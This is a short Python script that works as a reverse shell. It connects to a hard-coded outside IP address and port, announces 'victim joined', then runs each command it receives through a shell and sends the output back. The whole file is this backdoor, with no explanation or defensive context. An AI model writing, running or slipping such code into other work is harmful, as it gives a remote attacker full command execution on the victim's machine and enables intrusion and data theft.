from threading import Thread
from socket import *
import time
import os
import subprocess


def networking():
	HOST = '66.242.218.33'
	PORT = 1608
	
	s = socket(AF_INET, SOCK_STREAM)
	
	s.connect((HOST,PORT))
	s.send('victim joined')
	s.send('=============================================')
	
	while 1:
		data = s.recv(1024)
		if data == "quit":
			break
		
		proc = subprocess.Popen(data, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		
		stdoutput = proc.stdout.read() + proc.stderr.read()
		
		s.send(stdoutput)
		
		#exit loop

	s.send('victim left')
	s.close()

os.system('cls')
networking()